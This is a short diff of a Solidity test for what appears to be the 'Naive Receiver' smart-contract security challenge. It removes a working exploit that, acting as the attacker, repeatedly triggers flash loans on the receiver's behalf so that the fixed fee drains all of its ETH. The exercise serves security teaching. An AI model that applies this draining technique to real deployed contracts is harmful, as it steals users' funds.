@@ -54,17 +54,6 @@ contract NaiveReceiverTest is BaseTest {
 
     function exploit() internal override {
         /** CODE YOUR EXPLOIT HERE */
-
-        vm.startPrank(attacker);
-        uint256 flashFee = pool.fixedFee();
-        while (true) {
-            uint256 flashAmount = address(receiver).balance - flashFee;
-            pool.flashLoan(address(receiver), flashAmount);
-
-            // we have consumed all the ETH from the poor receiver :(
-            if (address(receiver).balance == 0) break;
-        }
-        vm.stopPrank();
     }
 
     function success() internal override {
